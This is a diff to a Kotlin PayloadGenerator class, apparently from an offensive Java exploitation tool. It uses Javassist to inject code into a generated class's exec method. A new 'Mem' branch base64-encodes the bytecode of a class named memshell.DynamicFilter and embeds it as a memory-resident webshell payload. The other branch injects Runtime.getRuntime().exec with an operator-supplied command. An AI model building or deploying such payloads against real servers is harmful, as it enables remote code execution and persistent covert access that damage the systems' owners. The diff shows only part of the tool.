@@ -4,6 +4,7 @@ import util.Options
 import javassist.*
 import javassist.bytecode.ClassFile.JAVA_7
 import javassist.bytecode.ClassFile.JAVA_8
+import java.util.*
 
 class PayloadGenerator {
     private val version = when (Options.javaVersion) {
@@ -32,9 +33,12 @@ class PayloadGenerator {
                     $0.result = new String(output);
                 }""".trimIndent()
             )
-        }
+        } else if (mapping == "Mem") {
+            val filterBytes = pool.getCtClass("http.payloads.memshell.DynamicFilter").toBytecode()
+            val b64Bytes = Base64.getEncoder().encode(filterBytes)
 
-        if (mapping != "Mem") {
+            ctClass.getDeclaredMethod("exec").insertBefore("{ $0.filterCode = \"${String(b64Bytes)}\"; }")
+        } else {
             ctClass.getDeclaredMethod("exec").insertBefore(
                 "{ Runtime.getRuntime().exec(\"${Options.command}\"); }"
             )
